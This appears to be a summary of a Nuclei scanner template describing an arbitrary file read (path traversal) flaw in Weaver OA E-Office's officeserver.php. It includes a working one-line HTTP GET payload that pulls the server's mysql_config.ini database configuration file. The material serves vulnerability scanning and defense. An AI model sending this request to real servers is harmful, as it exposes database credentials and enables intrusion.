# Nuclei Template: OA E-Office officeserver.php Arbitrary File Read
**Template ID:** weaver-officeserver-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`weaver-officeserver-lfi.yaml`)

## Vulnerability Information & PoC

## Description
There is an arbitrary file reading vulnerability in the OA E-Office officeserver.php file. An attacker can download any file on the server through the vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini
```

## References
- https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Office%20officeserver.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
